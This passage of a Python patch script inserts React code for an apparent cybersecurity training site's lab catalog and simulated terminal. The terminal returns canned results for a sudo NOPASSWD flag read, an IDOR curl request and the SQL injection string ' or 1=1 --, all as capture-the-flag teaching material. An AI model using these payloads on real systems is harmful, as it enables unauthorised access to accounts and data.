                <div className="p-5 rounded-2xl bg-[#FEF3C7] dark:bg-[#2B2011] border border-[#FDE68A] dark:border-[#523B15] flex flex-col md:flex-row items-center justify-between gap-4 shadow-sm">
                    <div className="flex items-center gap-4">
                        <div className="w-12 h-12 rounded-2xl bg-[#D97706] text-white flex items-center justify-center font-bold text-xl shrink-0 shadow-md">
                            <i className="fa-solid fa-id-card-clip"></i>
                        </div>
                        <div>
                            <h4 className="font-bold text-[#92400E] dark:text-[#FDE68A] text-base">Institutional Identity Verification Required</h4>
                            <p className="text-xs text-[#78350F] dark:text-[#E9D5AA] leading-relaxed max-w-2xl mt-0.5">
                                Cadets need to enroll first to start studying the courses. Verify your identity with your credentials or Continue with Google to unlock courseware, live terminals, and submit CTF flags for academic credit.
                            </p>
                        </div>
                    </div>
                    <div className="flex gap-2 shrink-0 w-full md:w-auto">
                        <button className="btn btn-primary btn-sm w-full md:w-auto whitespace-nowrap" onClick={onOpenAuth}>
                            <i className="fa-solid fa-user-check text-xs"></i>
                            <span>Verify Identity & Enroll</span>
                        </button>
                    </div>
                </div>
            ) : (
                <div className="p-5 rounded-2xl bg-[#F6EEF7] dark:bg-[#1A0E20] border border-[#DEC0E1] dark:border-[#382042] flex flex-col md:flex-row items-center justify-between gap-4 shadow-sm">
                    <div className="flex items-center gap-4">
                        <div className="w-12 h-12 rounded-2xl bg-[#4A154B] dark:bg-[#D580DC] text-white dark:text-[#120914] flex items-center justify-center font-bold text-xl shrink-0 shadow-md">
                            <i className="fa-solid fa-user-shield"></i>
                        </div>
                        <div>
                            <div className="flex items-center gap-2">
                                <h4 className="font-bold text-[#221224] dark:text-[#FAF5FB] text-base">Cadet Clearance: Verified Active Operative</h4>
                                <span className="badge badge-green text-[10px]"><i className="fa-solid fa-check-circle mr-1"></i> {user.username}</span>
                                {user.provider && <span className="badge badge-plum text-[10px]">{user.provider}</span>}
                            </div>
                            <p className="text-xs text-[#5D4B60] dark:text-[#D4C3D8] mt-0.5">
                                Verified Institutional Cohort. You are currently enrolled in {enrolledCourses.length} of {labs.length} laboratory pathways.
                            </p>
                        </div>
                    </div>
                    <div className="flex items-center gap-3 shrink-0">
                        <span className="text-xs font-bold text-[#4A154B] dark:text-[#DEC0E1] uppercase tracking-wider bg-white dark:bg-[#25132B] py-1.5 px-3 rounded-xl border border-[#DEC0E1] dark:border-[#382042]">
                            Senate Verified ✓
                        </span>
                    </div>
                </div>
            )}

            {/* Enrollment Notice Alert */}
            {enrollSuccessNotice && (
                <div className="p-4 rounded-xl bg-[#DCFCE7] dark:bg-[#112918] border border-[#BBF7D0] dark:border-[#1E4D2B] text-sm text-[#166534] dark:text-[#4ADE80] font-bold flex items-center justify-between shadow-sm">
                    <div className="flex items-center gap-2">
                        <i className="fa-solid fa-circle-check text-base"></i>
                        <span>{enrollSuccessNotice}</span>
                    </div>
                    <button className="text-xs text-[#166534] dark:text-[#4ADE80] hover:underline" onClick={() => setEnrollSuccessNotice('')}>
                        <i className="fa-solid fa-xmark"></i>
                    </button>
                </div>
            )}

            {/* If a lab is active, render the Interactive Workstation */}
            {currentLab ? (
                <InteractiveLabWorkstation 
                    lab={currentLab} 
                    onClose={() => setActiveLabId(null)} 
                    onAwardXp={onAwardXp}
                    studentStats={studentStats}
                />
            ) : (
                /* Lab Catalog Grid */
                <div className="grid-3">
                    {filteredLabs.length === 0 ? (
                        <div className="col-span-full card p-12 text-center text-[#8A788F] space-y-3">
                            <i className="fa-solid fa-folder-open text-3xl text-[#4A154B] dark:text-[#D580DC]"></i>
                            <h3 className="text-lg font-bold text-[#221224] dark:text-[#FAF5FB]">No courses found matching criteria</h3>
                            <p className="text-xs text-[#5D4B60] dark:text-[#D4C3D8]">Try clearing the search query or switching category filter tab.</p>
                            <button className="btn btn-secondary btn-sm mx-auto" onClick={() => { setFilterCategory('all'); setSearchQuery(''); }}>
                                Reset All Filters
                            </button>
                        </div>
                    ) : (
                        filteredLabs.map(lab => {
                            const isCompleted = studentStats.completed_tasks && studentStats.completed_tasks.includes(lab.id);
                            const isEnrolled = enrolledCourses.includes(lab.id);

                            // Level badge style
                            let levelBadgeClass = 'badge-green';
                            let levelIcon = 'fa-seedling';
                            if (lab.level === 'Intermediate') {
                                levelBadgeClass = 'badge-amber';
                                levelIcon = 'fa-shield-halved';
                            } else if (lab.level === 'Advanced') {
                                levelBadgeClass = 'badge-rose';
                                levelIcon = 'fa-crosshairs';
                            }

                            return (
                                <div key={lab.id} className="card card-hover flex flex-col justify-between">
                                    <div className="space-y-4">
                                        <div className="flex items-center justify-between">
                                            <div className="flex items-center gap-1.5">
                                                <span className={`badge ${levelBadgeClass}`}>
                                                    <i className={`fa-solid ${levelIcon} mr-1`}></i> {lab.level}
                                                </span>
                                                <span className="badge badge-plum">{lab.track}</span>
                                            </div>
                                            <span className="text-xs text-[#8A788F] font-semibold">
                                                <i className="fa-regular fa-clock mr-1"></i> {lab.duration}
                                            </span>
                                        </div>

                                        <h3 className="text-xl font-bold text-[#221224] dark:text-[#FAF5FB]">{lab.title}</h3>
                                        <p className="text-sm text-[#5D4B60] dark:text-[#D4C3D8] leading-relaxed">{lab.summary}</p>

                                        <div className="space-y-1.5 text-xs text-[#5D4B60] dark:text-[#D4C3D8] pt-2 border-t border-[#F0EAE2] dark:border-[#382042]">
                                            <div className="font-bold text-[#4A154B] dark:text-[#D580DC] uppercase text-[11px] mb-1">Key Objectives:</div>
                                            {lab.instructions.slice(0, 3).map((ins, i) => (
                                                <div key={i} className="flex items-start gap-2">
                                                    <i className="fa-solid fa-circle-check text-[#7B287D] dark:text-[#DEC0E1] text-[10px] mt-1 shrink-0"></i>
                                                    <span>{ins.replace(/`/g, '')}</span>
                                                </div>
                                            ))}
                                        </div>
                                    </div>

                                    <div className="pt-6 mt-6 border-t border-[#F0EAE2] dark:border-[#382042] flex items-center justify-between">
                                        <div className="flex flex-wrap items-center gap-1.5">
                                            <span className="badge badge-gold">+{lab.xp} XP</span>
                                            {isCompleted && <span className="badge badge-green"><i className="fa-solid fa-check"></i> Completed</span>}
                                            {isEnrolled ? (
                                                <span className="badge badge-green text-[11px]"><i className="fa-solid fa-check-circle mr-1"></i> Enrolled</span>
                                            ) : (
                                                <span className="badge badge-amber text-[11px]"><i className="fa-solid fa-lock mr-1"></i> Not Enrolled</span>
                                            )}
                                        </div>

                                        {isEnrolled ? (
                                            <button 
                                                className="btn btn-primary btn-sm"
                                                onClick={() => setActiveLabId(lab.id)}
                                            >
                                                <i className="fa-solid fa-terminal text-xs"></i>
                                                <span>{isCompleted ? 'Review Lab' : 'Launch Sandbox'}</span>
                                            </button>
                                        ) : (
                                            <button 
                                                className="btn btn-secondary btn-sm border-[#4A154B] text-[#4A154B] dark:text-[#FAF5FB] dark:border-[#DEC0E1] hover:bg-[#4A154B] hover:text-white"
                                                onClick={() => handleEnrollClick(lab)}
                                            >
                                                <i className="fa-solid fa-id-card-clip text-xs"></i>
                                                <span>Verify & Enroll</span>
                                            </button>
                                        )}
                                    </div>
                                </div>
                            );
                        })
                    )}
                </div>
            )}
        </div>
    );
}

/* ==========================================================================
   INTERACTIVE LAB WORKSTATION COMPONENT
   ========================================================================== */
function InteractiveLabWorkstation({ lab, onClose, onAwardXp, studentStats }) {
    const [flagInput, setFlagInput] = useState('');
    const [flagStatus, setFlagStatus] = useState(null); // null | 'success' | 'error'
    const [commandInput, setCommandInput] = useState('');
    const [terminalHistory, setTerminalHistory] = useState([
        { type: 'system', text: `Connected to ZYVERA Virtual Cyber Defense Sandbox: [${lab.id}-workstation-01]` },
        { type: 'system', text: `Type 'help' for instructions or 'ls' to view lab files.` },
    ]);
    const terminalEndRef = useRef(null);

    const isAlreadyCompleted = studentStats.completed_tasks && studentStats.completed_tasks.includes(lab.id);

    useEffect(() => {
        terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [terminalHistory]);

    const handleRunCommand = (e) => {
        e.preventDefault();
        const cmd = commandInput.trim();
        if (!cmd) return;

        setCommandInput('');
        setTerminalHistory(prev => [...prev, { type: 'user', text: `cadet@zyvera-lab:~$ ${cmd}` }]);

        setTimeout(() => {
            let output = '';
            const lower = cmd.toLowerCase();

            if (lower === 'clear') {
                setTerminalHistory([]);
                return;
            } else if (lower === 'help') {
                output = "Available simulated commands:\n  ls, dir, ls -la           List files in current lab sandbox\n  cat <file>                Read file contents\n  grep <pattern> <file>     Search text inside a file\n  whoami, id, pwd           Display identity and current directory\n  chmod <perms> <file>      Modify Linux file permissions (e.g. chmod 600 database.env)\n  sha256sum <file>          Calculate cryptographic SHA-256 hash\n  curl <url>                Execute simulated HTTP API query\n  ping <host>               Send ICMP probe packets\n  netstat                   Display active listening network sockets\n  python <script> [args]    Run analysis and defensive scripts\n  sudo -l, sudo cat <file>  Audit and execute privileged commands\n  clear                     Clear terminal screen";
            } else if (lower === 'whoami') {
                output = "cadet_operative (uid=1001, gid=1001, clearance=Level_1)";
            } else if (lower === 'id') {
                output = "uid=1001(cadet_operative) gid=1001(cadet_cohort) groups=1001(cadet_cohort)";
            } else if (lower === 'pwd') {
                output = `/home/cadet/zyvera_labs/${lab.id}`;
            } else if (lower === 'ls' || lower === 'dir') {
                output = Object.keys(lab.fileSystem).join('    ');
            } else if (lower === 'ls -la' || lower === 'ls -l') {
                const files = Object.keys(lab.fileSystem);
                const lines = ["total " + (files.length * 4)];
                files.forEach(f => {
                    const isSecret = f.includes('secret') || f.includes('key') || f.includes('env');
                    const perms = isSecret ? "-rwxrwxrwx 1 cadet cadet" : "-rw-r--r-- 1 cadet cadet";
                    lines.push(`${perms}  1024 Oct 02 21:00 ${f}`);
                });
                output = lines.join('\n');
            } else if (lower.startsWith('cat ')) {
                const target = cmd.slice(4).trim();
                if (target === '/root/flag.txt') {
                    output = "cat: /root/flag.txt: Permission denied (Access restricted to root)";
                } else if (lab.fileSystem[target]) {
                    output = lab.fileSystem[target];
                } else {
                    output = `cat: ${target}: No such file or directory`;
                }
            } else if (lower.startsWith('grep ')) {
                const parts = cmd.slice(5).trim().split(' ');
                if (parts.length >= 2) {
                    const pattern = parts[0].toLowerCase();
                    const targetFile = parts[1];
                    if (lab.fileSystem[targetFile]) {
                        const matched = lab.fileSystem[targetFile].split('\n').filter(line => line.toLowerCase().includes(pattern));
                        output = matched.length > 0 ? matched.join('\n') : "Pattern not found in " + targetFile;
                    } else {
                        output = `grep: ${targetFile}: No such file or directory`;
                    }
                } else {
                    output = "Usage: grep <pattern> <filename>";
                }
            } else if (lower.startsWith('chmod ')) {
                const parts = cmd.slice(6).trim().split(' ');
                if (parts.length >= 2) {
                    const perms = parts[0];
                    const target = parts[1];
                    output = `[CHMOD EXECUTED] Mode of '${target}' changed to ${perms} (Owner-restricted).`;
                } else {
                    output = "Usage: chmod <octal_mode> <filename> (e.g. chmod 600 database.env)";
                }
            } else if (lower.startsWith('sha256sum ')) {
                const target = cmd.slice(10).trim();
                if (target === 'patch_installer.bin') {
                    output = `7b287d9c4d9f6b216da154b4a154b7b287d9c4d9f6b216da154b7b287d9c4d9f  patch_installer.bin`;
                } else if (lab.fileSystem[target]) {
                    output = `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  ${target}`;
                } else {
                    output = `sha256sum: ${target}: No such file or directory`;
                }
            } else if (lower.startsWith('curl ')) {
                const url = cmd.slice(5).trim();
                if (url.includes('id=1') || url.includes('cadet')) {
                    output = `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "id": 1,\n  "username": "chief_security_officer",\n  "role": "global_admin",\n  "classified_token": "NCAS{idor_direct_object_reference_exposed}"\n}`;
                } else {
                    output = `HTTP/1.1 200 OK\nContent-Type: text/plain\n\n[Zyvera HTTP Endpoint Responder: Request Processed]`;
                }
            } else if (lower.startsWith('ping ')) {
                const targetHost = cmd.slice(5).trim();
                output = `PING ${targetHost} (192.168.1.10): 56 data bytes\n64 bytes from 192.168.1.10: icmp_seq=1 ttl=64 time=0.412 ms\n64 bytes from 192.168.1.10: icmp_seq=2 ttl=64 time=0.385 ms\n--- ${targetHost} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss`;
            } else if (lower === 'netstat' || lower === 'ss' || lower === 'netstat -ano') {
                output = "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN (SSH)\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN (HTTP)\ntcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN (HTTPS)\ntcp        0      0 192.168.1.50:54211      192.168.1.10:80         ESTABLISHED";
            } else if (lower === 'sudo -l') {
                if (lab.id === 'linux') {
                    output = "Matching Defaults entries for cadet_operative on workstation:\n    env_reset, mail_badpass\n\nUser cadet_operative may run the following commands on workstation:\n    (ALL) NOPASSWD: /usr/bin/cat /root/flag.txt";
                } else {
                    output = "Sorry, user cadet_operative may not run sudo on this host without administrative elevation.";
                }
            } else if (lower === 'sudo cat /root/flag.txt' || lower === 'sudo /usr/bin/cat /root/flag.txt') {
                if (lab.id === 'linux') {
                    output = `[ROOT ACCESS GRANTED]\n${lab.fileSystem['/root/flag.txt']}\n\nCopy this token and submit in the Flag Validator below!`;
                } else {
                    output = "Access denied.";
                }
            } else if (lower.startsWith('python ')) {
                const scriptCall = cmd.slice(7).trim();
                const parts = scriptCall.split(' ');
                const script = parts[0];
                const arg = parts.slice(1).join(' ');

                if (lab.fileSystem[script]) {
                    // Check if it's isolate_host.py with IP
                    if (script === 'isolate_host.py' && arg) {
                        output = `[*] Executing SOC Containment Protocol...\n[+] Adversary IP ${arg} added to perimeter iptables DROP list.\n[+] Target host 192.168.1.105 isolated from corporate subnet to prevent lateral movement.\n[+] Incident Status: CONTAINED.\n[+] NIST Phase 3 Containment Certificate: NCAS{soc_triage_quarantine_isolate_success}`;
                    } else {
                        output = lab.fileSystem[script];
                    }
                } else {
                    output = `python: can't open file '${script}': [Errno 2] No such file or directory`;
                }
            } else if (lower.includes("' or 1=1 --") || lower.includes('" or 1=1 --')) {
                output = `[SQL INJECTION TRIGGERED]\nQuery evaluated as TRUE.\nBypassed password check!\nReturned session flag: ${lab.flag}`;
            } else {
                output = `bash: ${cmd}: command not recognized. Type 'help' for instructions.`;
            }

            setTerminalHistory(prev => [...prev, { type: 'response', text: output }]);
        }, 150);
    };

    const handleFlagSubmit = (e) => {
        e.preventDefault();
        if (!flagInput.trim()) return;

        if (flagInput.trim() === lab.flag) {
            setFlagStatus('success');
            onAwardXp(lab.id, lab.title, lab.xp);
        } else {
            setFlagStatus('error');
        }
    };

    return (
        <div className="space-y-6">
            {/* Top Bar with Back Link */}
            <div className="flex items-center justify-between bg-white dark:bg-[#1A0E20] border border-[#E8DFD5] dark:border-[#382042] rounded-2xl p-4 shadow-sm">
                <div className="flex items-center gap-3">
                    <button className="btn btn-secondary btn-sm" onClick={onClose}>
                        <i className="fa-solid fa-arrow-left"></i>
                        <span>Exit Sandbox</span>
                    </button>
                    <div>
                        <div className="flex items-center gap-2">
                            <h3 className="font-bold text-[#221224] dark:text-[#FAF5FB] text-lg">{lab.title}</h3>
                            <span className="badge badge-plum text-[10px]">{lab.track}</span>
                            <span className="badge badge-gold text-[10px]">+{lab.xp} XP</span>
                        </div>
                        <div className="text-xs text-[#8A788F]">
                            Level: {lab.level} • Estimated Time: {lab.duration} • Virtual Node: {lab.id}-workstation-01
                        </div>
                    </div>
                </div>

                <div className="flex items-center gap-2">
                    <span className="badge badge-green text-xs">
                        <span className="w-2 h-2 rounded-full bg-[#166534] dark:bg-[#4ADE80] animate-pulse mr-1"></span>
                        Sandbox Active
                    </span>
                </div>
            </div>

            {/* Split Screen: Left = Briefing & Instructions, Right = Simulated Terminal */}
            <div className="grid-2">
                {/* Left Panel: Lab Syllabus & Steps */}
                <div className="space-y-6">
                    {/* Theoretical Foundations & Key Concepts */}
                    <div className="card space-y-4">
                        <div className="flex items-center gap-2">
                            <span className="badge badge-gold">
                                <i className="fa-solid fa-book-open mr-1"></i> Foundational Theory & Concepts
                            </span>
                        </div>
                        <h4 className="text-lg font-bold text-[#221224] dark:text-[#FAF5FB]">Understanding the Core Principles</h4>
                        <p className="text-sm text-[#5D4B60] dark:text-[#D4C3D8] leading-relaxed">
                            {lab.theory || lab.summary}
                        </p>
                    </div>

                    {/* Practical Steps Briefing */}
                    <div className="card space-y-4">
                        <div>
                            <div className="badge badge-plum mb-2">Step-by-Step Practical Briefing</div>
                            <h4 className="text-lg font-bold text-[#221224] dark:text-[#FAF5FB]">Laboratory Protocol & Instructions</h4>
                            <p className="text-xs text-[#5D4B60] dark:text-[#D4C3D8] mt-1">{lab.summary}</p>
                        </div>

                        <div className="space-y-2.5">
                            <div className="text-xs font-bold uppercase tracking-wider text-[#4A154B] dark:text-[#D580DC]">Procedure Checklist:</div>
                            {lab.instructions.map((ins, i) => (
                                <div key={i} className="flex gap-3 text-xs md:text-sm text-[#5D4B60] dark:text-[#D4C3D8] bg-[#FAF7F2] dark:bg-[#160D1C] p-3 rounded-xl border border-[#E8DFD5] dark:border-[#382042]">
                                    <span className="w-5 h-5 rounded-full bg-[#4A154B] dark:bg-[#D580DC] text-white dark:text-[#120914] flex items-center justify-center text-xs font-bold shrink-0">
                                        {i + 1}
                                    </span>
                                    <div className="leading-relaxed font-mono text-xs">{ins}</div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Flag Validator */}
                    <div className="p-5 rounded-2xl bg-[#F6EEF7] dark:bg-[#1A0E20] border border-[#DEC0E1] dark:border-[#382042] space-y-4">
                        <div className="flex items-center justify-between">
                            <span className="text-xs font-bold uppercase tracking-wider text-[#4A154B] dark:text-[#DEC0E1]">
                                <i className="fa-solid fa-flag text-[#7B287D] dark:text-[#D580DC] mr-1.5"></i> CTF Flag Verification & XP Claim
                            </span>
                            {isAlreadyCompleted && (
                                <span className="badge badge-green text-[10px]">Verified Completed</span>
                            )}
                        </div>

                        <form onSubmit={handleFlagSubmit} className="space-y-3">
                            <div className="flex gap-2">
                                <input 
                                    className="form-control"
                                    placeholder="Format: NCAS{flag_code_here}"
                                    value={flagInput}
                                    onChange={e => { setFlagInput(e.target.value); setFlagStatus(null); }}
                                />
                                <button type="submit" className="btn btn-primary shrink-0">
                                    Submit Flag
                                </button>
                            </div>

                            {flagStatus === 'success' && (
                                <div className="p-3 rounded-xl bg-[#DCFCE7] dark:bg-[#112918] border border-[#BBF7D0] dark:border-[#1E4D2B] text-xs font-bold text-[#166534] dark:text-[#4ADE80] flex items-center gap-2">
                                    <i className="fa-solid fa-circle-check text-sm"></i>
                                    Flag verified successfully! +{lab.xp} XP credited to your academic transcript.
                                </div>
                            )}

                            {flagStatus === 'error' && (
                                <div className="p-3 rounded-xl bg-[#FEE2E2] dark:bg-[#2B1111] border border-[#FECACA] dark:border-[#4D1B1B] text-xs font-bold text-[#991B1B] dark:text-[#F87171] flex items-center gap-2">
                                    <i className="fa-solid fa-triangle-exclamation text-sm"></i>
                                    Invalid flag token. Review the terminal outputs carefully and follow the procedure checklist.
                                </div>
                            )}
                        </form>
                    </div>
                </div>

                {/* Right Panel: Simulated Terminal */}
                <div className="lab-terminal-box flex flex-col h-[600px] shadow-lg">
                    <div className="terminal-titlebar">
                        <div className="terminal-dots">
                            <div className="terminal-dot bg-[#EF4444]"></div>
                            <div className="terminal-dot bg-[#F59E0B]"></div>
                            <div className="terminal-dot bg-[#10B981]"></div>
                        </div>
                        <div className="text-xs text-[#DEC0E1] font-mono">cadet@zyvera-lab: /labs/{lab.id}</div>
                        <div className="text-[11px] text-[#A396A6]">BASH 5.2 • Virtual PTY</div>
                    </div>

                    {/* Terminal Scroll Log */}
                    <div className="terminal-body flex-1 overflow-y-auto p-4 space-y-2 font-mono text-xs">
                        {terminalHistory.map((item, idx) => (
                            <div key={idx} className="mb-2">
                                {item.type === 'system' && (
                                    <div className="text-[#A396A6]">{item.text}</div>
                                )}
                                {item.type === 'user' && (
                                    <div className="text-[#34D399] font-bold">{item.text}</div>
                                )}
                                {item.type === 'response' && (
                                    <pre className="text-[#F7EFF8] whitespace-pre-wrap font-mono mt-0.5">{item.text}</pre>
                                )}
                            </div>
                        ))}
                        <div ref={terminalEndRef} />
                    </div>

                    {/* Terminal Command Input Form */}
                    <form onSubmit={handleRunCommand} className="p-3 bg-[#27172A] border-t border-[#3B243E] flex items-center gap-2">
                        <span className="text-[#34D399] text-xs font-mono font-bold">$</span>
                        <input 
                            className="w-full bg-transparent text-white font-mono text-xs outline-none border-none placeholder-[#6B5A6E]"
                            placeholder="Type command (e.g. ls, cat security_policy.txt, python audit_cia.py)..."
                            value={commandInput}
                            onChange={e => setCommandInput(e.target.value)}
                            autoFocus
                        />
                        <button type="submit" className="text-xs text-[#DEC0E1] hover:text-white px-3 py-1 bg-[#3B243E] rounded font-semibold transition">
                            Run
                        </button>
                    </form>
                </div>
            </div>
        </div>
    );
}
'''

# Read current app_react.js
path = "src/js/app_react.js"
with open(path, "r", encoding="utf-8") as f:
    orig = f.read()

start_marker = "/* ==========================================================================\n   PAGE 2: CURRICULUM & INTERACTIVE LABS\n   ========================================================================== */"
end_marker = "/* ==========================================================================\n   ACADEMIC CONTROL HUB & FACULTY REGISTRAR\n   ========================================================================== */"

start_idx = orig.find(start_marker)
end_idx = orig.find(end_marker)

if start_idx == -1:
    # Try alternative newline matching
    start_marker = "PAGE 2: CURRICULUM & INTERACTIVE LABS"
    start_idx = orig.find(start_marker)
    if start_idx != -1:
        # back up to previous /*
        start_idx = orig.rfind("/*", 0, start_idx)

if end_idx == -1:
    end_marker = "ACADEMIC CONTROL HUB & FACULTY REGISTRAR"
    end_idx = orig.find(end_marker)
    if end_idx != -1:
        end_idx = orig.rfind("/*", 0, end_idx)

if start_idx == -1 or end_idx == -1:
    print(f"Error finding markers: start_idx={start_idx}, end_idx={end_idx}")
    sys.exit(1)

new_content = orig[:start_idx] + courses_code + "\n\n" + orig[end_idx:]

with open(path, "w", encoding="utf-8") as f:
    f.write(new_content)

print(f"Successfully replaced CoursesPage & InteractiveLabWorkstation! Replaced slice from {start_idx} to {end_idx}.")
